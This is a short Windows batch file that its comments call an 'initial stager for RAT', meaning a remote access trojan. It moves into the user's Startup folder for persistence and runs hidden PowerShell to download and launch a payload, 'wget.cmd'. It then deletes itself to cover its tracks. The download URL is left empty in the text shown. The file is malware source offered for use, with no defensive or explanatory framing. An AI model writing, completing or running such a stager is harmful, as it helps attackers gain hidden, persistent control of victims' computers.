@echo off
@REM initial stager for RAT
@REM created by: Sunnickel
@REM inspired by: COSMO

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into Startup Dir
cd "%STARTUP%"

@REM write payloads to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri "

@REM run payload
powershell Start-Process powershell.exe -windowstyle hidden -FilePath "wget.cmd" -WorkingDirectory "%STARTUP%/files/"

@REM cd change back to initial location
cd "%INITIALPATH%"
del /f initial.cmd

